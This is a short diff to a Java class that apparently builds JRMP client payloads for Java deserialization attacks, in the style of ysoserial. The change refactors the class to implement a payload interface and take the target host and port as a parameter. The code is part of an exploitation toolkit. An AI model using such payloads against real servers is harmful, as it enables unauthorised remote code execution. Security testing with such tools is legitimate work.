@@ -11,9 +11,9 @@ import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObjectInvocationHandler;
 import java.util.Random;
 
-public class JRMPClient_Obj {
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String command = String.valueOf(type);
+public class JRMPClient_Obj implements ObjectPayload<RemoteObjectInvocationHandler>{
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
         String host;
         int    port, sep = command.indexOf(':');
         if (sep < 0) {
@@ -36,5 +36,10 @@ public class JRMPClient_Obj {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public RemoteObjectInvocationHandler getObject(String command) throws Exception {
+        return null;
     }
 }
